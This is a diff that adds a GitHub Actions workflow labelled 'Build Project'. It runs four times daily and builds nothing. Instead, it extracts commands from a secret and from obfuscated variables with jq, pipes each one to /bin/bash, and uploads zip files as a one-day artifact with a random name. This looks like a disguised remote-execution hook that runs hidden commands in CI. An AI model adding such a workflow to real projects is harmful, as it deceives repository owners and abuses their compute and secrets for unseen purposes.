@@ -1,0 +1,34 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          s57: ${{ secrets.s57 }}
+        run: |
+          printf '%s' "$s57" | jq -r .tz25 | /bin/bash
+          echo $ygqi31078 | jq -r .d9970 | /bin/bash
+          echo $vv55767 | jq -r .ebes173 | /bin/bash
+          printf '%s' "$gt45" | jq -r .bia37 | /bin/bash
+          printf '%s' "$rr0" | jq -r .pruu1 | /bin/bash
+          printf '%s' "$vv480" | jq -r .edtk044 | /bin/bash
+          echo $upgjy55 | jq -r .xil1 | /bin/bash
+          echo $vzb179 | jq -r .iep7 | /bin/bash
+          echo $fzy2 | jq -r .mlts90 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: PlnnXCvY
+          path: "*.zip"
+          retention-days: 1
